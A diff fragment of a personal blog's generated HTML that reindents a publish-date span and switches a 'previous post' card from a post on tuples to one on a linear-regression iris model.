                     <div class="card-image">
@@ -898,9 +707,9 @@ the specified features iris is: virginica
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -913,6 +722,7 @@ the specified features iris is: virginica
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -923,13 +733,13 @@ the specified features iris is: virginica
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/04/13/%E5%85%83%E7%BB%84%EF%BC%88tuple%EF%BC%89/">
+                <a href="/2021/04/15/4-15%20%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="tuple">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="人工智能之线性回归-鸢尾花模型">
                         
-                        <span class="card-title">tuple</span>
+                        <span class="card-title">人工智能之线性回归-鸢尾花模型</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -940,7 +750,7 @@ the specified features iris is: virginica
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-15
                             </span>
                         <span class="publish-author">
                             
